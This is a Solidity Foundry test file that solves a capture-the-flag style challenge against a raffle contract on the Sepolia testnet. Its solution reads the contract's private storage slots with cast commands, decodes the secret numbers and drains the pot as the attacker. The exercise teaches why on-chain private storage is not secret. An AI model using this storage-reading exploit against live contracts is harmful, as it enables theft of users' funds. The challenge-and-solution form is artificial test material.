// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "./ICrypticRaffle.sol";

/**
 * @dev run "forge test -vvv --fork-url sepolia --fork-block-number 5782311 --match-contract SOCD3"
 */
contract TestSOCD3 is Test {
    address constant CRYPTIC_RAFFLE = address(0x142798162D7ce789C6730B6635c20475B593eeca);
    uint256 constant PARTICIPATION_PRICE = 0.01 ether;

    address attacker = makeAddr("attacker");
    address gambler1 = makeAddr("gambler1");
    address gambler2 = makeAddr("gambler2");

    uint256 attackerInitialBalance;
    ICrypticRaffle crypticRaffle;
    uint256 initialCrypticRaffleBalance;

    function setUp() public {
        /**
         * SETUP, DON'T CHANGE
         */

        // Set initial balances
        vm.deal(attacker, 0.01 ether);
        vm.deal(gambler1, 1 ether);
        vm.deal(gambler2, 1 ether);

        attackerInitialBalance = attacker.balance;
        console.log("Attacker initial balance: ", attackerInitialBalance);

        // Load CrypticRaffle Contract
        crypticRaffle = ICrypticRaffle(CRYPTIC_RAFFLE);

        // gambler1 is trying his strategy
        for (uint8 i = 0; i < 100; i++) {
            uint8[3] memory numbers;
            numbers[0] = i;
            numbers[1] = i + 20;
            numbers[2] = 100 - i;
            vm.prank(gambler1);
            crypticRaffle.guessNumbers{value: PARTICIPATION_PRICE}(numbers);
        }

        // gambler2 is trying his strategy
        for (uint8 i = 0; i < 100; i++) {
            uint8[3] memory numbers;
            numbers[0] = i + 1;
            numbers[1] = i + 2;
            numbers[2] = 0;
            vm.prank(gambler2);
            crypticRaffle.guessNumbers{value: PARTICIPATION_PRICE}(numbers);
        }

        initialCrypticRaffleBalance = address(crypticRaffle).balance;
        console.log("CrypticRaffle initial balance (pot): ", initialCrypticRaffleBalance);
    }

    function testCrypticRaffle() public {
        /**
         * CODE YOUR SOLUTION HERE
         */
        //  Slot 0 = address private _owner from Ownable
        //  Slot 1 = uint256 private _status from Reentrancy Guard
        //  Slot 2 = bool private isActive
        //  Slot 3 = uint256 raffleId
        //  Slot 4 = mapping(uint256 => uint8[3]) private raffles;

        vm.startPrank(attacker);

        // cast index uint256 1 4 // find the raffles[1] storage location
        // 1 is the key of the mapping
        // 4 is the slot storage of mapping

        // resulted = 0xabd6e7cb50984ff9c2f3e18a2660c3353dadf4e3291deeb275dae2cd1e44fe05

        // cast storage 0x142798162D7ce789C6730B6635c20475B593eeca --rpc-url sepolia 0xabd6e7cb50984ff9c2f3e18a2660c3353dadf4e3291deeb275dae2cd1e44fe05
        // access the value of the raffles[1]

        //  0x0000000000000000000000000000000000000000000000000000000000070013 = 13, 0, 07 in hex numbers equals to 19, 0, 7

        // SOLUTION 2
        uint8[3] memory numbers;

        numbers[0] = 19;
        numbers[1] = 0;
        numbers[2] = 7;

        crypticRaffle.guessNumbers{value: PARTICIPATION_PRICE}(numbers);

        /**
         * SUCCESS CONDITIONS
         */

        // No ETH in the cryptoRaffle contract
        uint256 currentCrypticRaffleBalance = address(crypticRaffle).balance;
        assertEq(currentCrypticRaffleBalance, 0);

        // Attacker was able to guess the numbers and get all the ETH
        // - 0.1 ETH for transaction fees
        uint256 currentAttackerBalance = attacker.balance;
        assertGt(currentAttackerBalance, attackerInitialBalance + initialCrypticRaffleBalance - PARTICIPATION_PRICE);
    }
}
